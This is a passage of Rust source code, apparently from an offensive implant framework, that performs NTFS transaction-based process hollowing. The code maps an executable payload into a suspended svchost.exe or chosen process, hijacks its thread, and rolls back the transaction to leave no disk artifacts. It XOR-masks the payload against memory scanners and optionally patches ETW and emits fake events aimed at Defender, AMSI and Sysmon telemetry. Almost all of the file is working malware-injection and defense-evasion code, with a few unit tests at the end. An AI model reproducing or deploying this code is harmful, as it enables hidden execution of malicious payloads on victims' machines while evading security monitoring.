    // Write payload into local mapping.
    std::ptr::copy_nonoverlapping(payload.as_ptr(), local_base as *mut u8, payload.len());

    // Unmap from our process — the section object retains the data.
    let _ = crate::syscall!("NtUnmapViewOfSection", CURRENT_PROCESS, local_base as u64,);

    tracing::debug!(
        "injection_transacted: wrote {} bytes to section",
        payload.len()
    );
    Ok(())
}

/// Map a section into the target process with PAGE_EXECUTE_READ.
unsafe fn map_section_to_target(h_section: usize, process_handle: usize) -> Result<usize, String> {
    let mut remote_base: *mut c_void = std::ptr::null_mut();
    let mut view_size: usize = 0;

    let map_status = crate::syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        process_handle as u64,
        &mut remote_base as *mut _ as u64,
        0u64,
        0u64,
        0u64,
        &mut view_size as *mut _ as u64,
        2u64, // ViewUnmap
        0u64,
        PAGE_EXECUTE_READ,
    );

    if map_status.as_ref().map_or(true, |s| *s < 0) || remote_base.is_null() {
        return Err(format!(
            "NtMapViewOfSection(remote RX) failed: status={:?}",
            map_status
        ));
    }

    tracing::debug!(
        "injection_transacted: mapped section into target at {:#x}",
        remote_base as usize
    );
    Ok(remote_base as usize)
}

// ── Thread context manipulation ──────────────────────────────────────────────

/// Redirect a suspended thread's instruction pointer to the payload address.
unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(), String> {
    use crate::win_types::CONTEXT;

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = crate::win_types::CONTEXT_FULL;

    let status = crate::syscall!(
        "NtGetContextThread",
        thread_handle as u64,
        &mut ctx as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("NtGetContextThread failed".to_string());
    }

    #[cfg(target_arch = "x86_64")]
    {
        ctx.Rip = payload_addr as u64;
    }
    #[cfg(target_arch = "aarch64")]
    {
        ctx.Pc = payload_addr as u64;
    }

    let status = crate::syscall!(
        "NtSetContextThread",
        thread_handle as u64,
        &ctx as *const _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("NtSetContextThread failed".to_string());
    }

    tracing::debug!(
        "injection_transacted: redirected thread instruction pointer to {:#x}",
        payload_addr
    );
    Ok(())
}

/// Resume a suspended thread.
unsafe fn resume_thread(thread_handle: usize) -> Result<(), String> {
    let status = crate::syscall!(
        "NtResumeThread",
        thread_handle as u64,
        0u64, // PreviousSuspendCount = NULL
    );

    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err(format!("NtResumeThread failed: status={:?}", status));
    }

    tracing::debug!("injection_transacted: resumed target thread");
    Ok(())
}

// ── Memory guard integration ─────────────────────────────────────────────────

/// XOR key length used for in-transit payload encryption.
const XOR_KEY_LEN: usize = 32;

/// Encrypted payload together with the key needed to decrypt it.
struct GuardedPayload {
    /// XOR-encrypted payload bytes.
    encrypted: Vec<u8>,
    /// Key used for encryption (will be zeroed after decryption).
    key: [u8; XOR_KEY_LEN],
}

impl GuardedPayload {
    /// Decrypt in place, returning the plaintext `Vec<u8>`.
    /// The encrypted buffer and key are zeroed after decryption.
    fn decrypt_and_zero(mut self) -> Vec<u8> {
        let mut plaintext = Vec::with_capacity(self.encrypted.len());
        // Decrypt while building plaintext — plaintext only lives in the
        // returned Vec, not in any intermediate buffer on the heap.
        for (i, &byte) in self.encrypted.iter().enumerate() {
            plaintext.push(byte ^ self.key[i % XOR_KEY_LEN]);
        }
        // Zero the encrypted buffer and key.
        unsafe {
            std::ptr::write_bytes(self.encrypted.as_mut_ptr(), 0, self.encrypted.len());
            std::ptr::write_bytes(self.key.as_mut_ptr(), 0, XOR_KEY_LEN);
        }
        plaintext
    }
}

impl Drop for GuardedPayload {
    fn drop(&mut self) {
        // Safety net: zero on drop if decrypt_and_zero was not called.
        unsafe {
            std::ptr::write_bytes(self.key.as_mut_ptr(), 0, XOR_KEY_LEN);
        }
    }
}

/// Encrypt the payload in transit so that it does not sit in cleartext on
/// our heap while the transacted hollowing flow is being set up.
///
/// The payload is XOR-encrypted with a random 32-byte key.  The caller
/// should use `GuardedPayload::decrypt_and_zero` right before writing to
/// the section, minimising the window during which plaintext exists in
/// user-space memory.
fn encrypt_payload_in_transit(payload: &[u8]) -> GuardedPayload {
    // Generate a random key.  We use a simple LCG seeded from the system
    // clock because the `rand` crate may not be available in all build
    // configurations.  This is not cryptographic — the goal is to prevent
    // static pattern-matching by memory scanners, not to resist a
    // determined cryptanalyst.
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    let mut seed = now;
    let mut key = [0u8; XOR_KEY_LEN];
    for byte in key.iter_mut() {
        // xorshift64
        seed ^= seed << 13;
        seed ^= seed >> 7;
        seed ^= seed << 17;
        *byte = (seed & 0xFF) as u8;
    }

    let mut encrypted = payload.to_vec();
    for (i, byte) in encrypted.iter_mut().enumerate() {
        *byte ^= key[i % XOR_KEY_LEN];
    }

    GuardedPayload { encrypted, key }
}

// ── Main entry point ─────────────────────────────────────────────────────────

/// Perform NTFS transaction-based process hollowing with ETW blinding.
///
/// # Arguments
///
/// * `payload` - Shellcode or PE bytes to inject.
/// * `etw_blinding` - Whether to perform ETW blinding on the target.
/// * `rollback_timeout_ms` - Timeout for the transaction rollback.
///
/// # Returns
///
/// An `InjectionHandle` on success, or an `InjectionError` on failure.
///
/// # Safety
///
/// Performs raw memory operations and Windows system calls. Must only be
/// called on Windows x86-64.
pub unsafe fn inject_transacted_hollowing(
    payload: &[u8],
    target_process: Option<&str>,
    etw_blinding: bool,
    rollback_timeout_ms: u32,
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::TransactedHollowing;

    tracing::info!(
        "injection_transacted: starting NTFS transaction hollowing (payload={} bytes, target={:?}, etw_blinding={}, timeout={}ms)",
        payload.len(),
        target_process,
        etw_blinding,
        rollback_timeout_ms,
    );

    // ── Step 1: Create NTFS transaction ───────────────────────────────
    let tx = create_transaction().map_err(|reason| InjectionError::InjectionFailed {
        technique: technique.clone(),
        reason,
    })?;

    tracing::debug!(
        "injection_transacted: transaction created, handle={:#x}",
        tx.handle
    );

    // ── Step 2: Create section ────────────────────────────────────────
    let h_section = create_transacted_section(tx.handle, payload.len()).map_err(|reason| {
        close_handle(tx.handle);
        InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason,
        }
    })?;

    // ── Step 3: Write payload into section ────────────────────────────
    // Encrypt payload in transit via memory guard — it sits encrypted in
    // our heap while the transaction and section are being prepared.  We
    // decrypt it only at the point of writing into the section mapping so
    // that cleartext exists in user-space for the shortest possible window.
    let guarded = encrypt_payload_in_transit(payload);

    // Decrypt right before the section write.  The plaintext Vec only
    // exists for the duration of the write_payload_to_section call (which
    // copies it into a local section mapping and then unmaps).  After the
    // write the plaintext Vec is dropped and its memory zeroed.
    {
        let plaintext = guarded.decrypt_and_zero();
        write_payload_to_section(h_section, &plaintext).map_err(|reason| {
            let _ = crate::syscall!("NtClose", h_section as u64);
            close_handle(tx.handle);
            InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason,
            }
        })?;
        // plaintext goes out of scope here — Drop impl zeroes it
    }

    // ── Step 4: Create suspended process ──────────────────────────────
    let sacrificial_path = get_sacrificial_path(target_process);
    let target = create_suspended_process(&sacrificial_path).map_err(|reason| {
        let _ = crate::syscall!("NtClose", h_section as u64);
        close_handle(tx.handle);
        InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason,
        }
    })?;

    tracing::info!(
        "injection_transacted: created suspended process pid={}",
        target.pid
    );

    // ── Step 5: ETW blinding (optional) ───────────────────────────────
    let mut etw_ctx: Option<EtwBlindingContext> = None;

    if etw_blinding {
        match patch_remote_etw(target.process_handle) {
            Ok(ctx) => {
                // Allocate a small region in the target for fake ETW event data.
                let mut fake_region_base: usize = 0;
                let mut region_size: usize = 0x1000; // One page for fake event data
                let alloc_status = crate::syscall!(
                    "NtAllocateVirtualMemory",
                    target.process_handle as u64,
                    &mut fake_region_base as *mut _ as u64,
                    0u64,
                    &mut region_size as *mut _ as u64,
                    0x3000u64, // MEM_COMMIT | MEM_RESERVE
                    PAGE_READWRITE,
                );

                if alloc_status.is_ok() && alloc_status.unwrap() >= 0 && fake_region_base != 0 {
                    let _ = emit_fake_etw_events(target.process_handle, fake_region_base);
                }

                etw_ctx = Some(ctx);
            }
            Err(e) => {
                tracing::warn!(
                    "injection_transacted: ETW blinding failed (non-fatal): {}",
                    e
                );
                // Continue without ETW blinding — it's optional.
            }
        }
    }

    // ── Step 6: Map section into target process ───────────────────────
    let remote_base =
        map_section_to_target(h_section, target.process_handle).map_err(|reason| {
            // Restore ETW if we patched it.
            if let Some(ref ctx) = etw_ctx {
                let _ = restore_remote_etw(ctx);
            }
            // Terminate the suspended process.
            let _ = crate::syscall!(
                "NtTerminateProcess",
                target.process_handle as u64,
                1u64 // Exit status
            );
            let _ = crate::syscall!("NtClose", target.process_handle as u64);
            let _ = crate::syscall!("NtClose", target.thread_handle as u64);
            let _ = crate::syscall!("NtClose", h_section as u64);
            close_handle(tx.handle);
            InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason,
            }
        })?;

    tracing::debug!(
        "injection_transacted: payload mapped at {:#x} in target pid={}",
        remote_base,
        target.pid
    );

    // ── Step 7: Redirect thread to payload ────────────────────────────
    redirect_thread(target.thread_handle, remote_base).map_err(|reason| {
        if let Some(ref ctx) = etw_ctx {
            let _ = restore_remote_etw(ctx);
        }
        let _ = crate::syscall!("NtTerminateProcess", target.process_handle as u64, 1u64);
        let _ = crate::syscall!("NtClose", target.process_handle as u64);
        let _ = crate::syscall!("NtClose", target.thread_handle as u64);
        let _ = crate::syscall!("NtClose", h_section as u64);
        close_handle(tx.handle);
        InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason,
        }
    })?;

    // ── Step 8: Roll back the transaction ─────────────────────────────
    //
    // KEY INSIGHT: NtRollbackTransaction rolls back all file operations
    // within the transaction, but does NOT invalidate existing section
    // mappings. The section data mapped into the target process persists
    // even after the transaction is rolled back. Any files created within
    // the transaction are deleted — the on-disk artifacts never existed.
    match rollback_transaction(&tx) {
        Ok(()) => {
            tracing::info!("injection_transacted: transaction rolled back — no disk artifacts");
        }
        Err(e) => {
            tracing::warn!(
                "injection_transacted: transaction rollback failed (non-fatal, payload already mapped): {}",
                e
            );
        }
    }

    close_handle(tx.handle);

    // ── Step 9: Restore ETW (if patched) and resume thread ────────────
    if let Some(ref ctx) = etw_ctx {
        let _ = restore_remote_etw(ctx);
    }

    resume_thread(target.thread_handle).map_err(|reason| {
        let _ = crate::syscall!("NtClose", target.process_handle as u64);
        let _ = crate::syscall!("NtClose", target.thread_handle as u64);
        let _ = crate::syscall!("NtClose", h_section as u64);
        InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason,
        }
    })?;

    tracing::info!(
        "injection_transacted: injection complete — pid={}, base={:#x}",
        target.pid,
        remote_base
    );

    // ── Cleanup and return ────────────────────────────────────────────
    // Don't close section handle yet — the target has a mapping that
    // references it. The handle will be cleaned up when the target exits.
    let _ = crate::syscall!("NtClose", h_section as u64);

    Ok(InjectionHandle {
        target_pid: target.pid,
        technique_used: technique,
        injected_base_addr: remote_base,
        payload_size: payload.len(),
        thread_handle: Some(target.thread_handle as *mut c_void),
        process_handle: target.process_handle as *mut c_void,
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

// ── Unit tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_page_align() {
        let ps = crate::page_size::system_page_size();
        assert_eq!(page_align(0), 0);
        assert_eq!(page_align(1), ps);
        assert_eq!(page_align(ps), ps);
        assert_eq!(page_align(ps + 1), ps * 2);
    }

    #[test]
    fn test_get_sacrificial_path_default() {
        let path = get_sacrificial_path(None);
        let path_str: String = String::from_utf16_lossy(&path[..path.len() - 1]);
        assert!(path_str.contains("svchost.exe"));
    }

    #[test]
    fn test_get_sacrificial_path_override() {
        let path = get_sacrificial_path(Some("notepad.exe"));
        let path_str: String = String::from_utf16_lossy(&path[..path.len() - 1]);
        assert!(path_str.contains("notepad.exe"));
        assert!(path_str.contains(r"System32\notepad.exe"));
    }

    #[test]
    fn test_fake_etw_provider_guids_nonzero() {
        // Verify the GUIDs are non-zero (sanity check).
        assert_ne!(DEFENDER_PROVIDER_GUID, [0u8; 16]);
        assert_ne!(AMSI_PROVIDER_GUID, [0u8; 16]);
        assert_ne!(SYSMON_PROVIDER_GUID, [0u8; 16]);
    }

    #[test]
    fn test_transaction_handle_struct() {
        let tx = TransactionHandle {
            handle: 0x1234,
            fallback: false,
        };
        assert_eq!(tx.handle, 0x1234);
        assert!(!tx.fallback);
    }
}
